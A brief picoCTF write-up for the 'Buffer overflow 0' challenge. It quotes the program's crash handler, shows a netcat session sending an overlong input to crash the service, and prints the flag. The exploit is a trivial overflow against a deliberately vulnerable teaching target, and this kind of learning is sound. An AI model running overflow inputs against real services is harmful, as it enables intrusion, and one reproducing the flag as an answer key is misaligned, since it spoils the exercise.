# 1. Buffer overflow 0
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Additional details will be available after launching your challenge instance.

## Solution:
by going through the code i got to know that if we get a segmentation fault we will get the flag 

```java
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
simply stacked the terminal and got the flag
```bash
nc saturn.picoctf.net 61792
Input: 111111111111111111111111111111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:

- reading a code and interpretting it
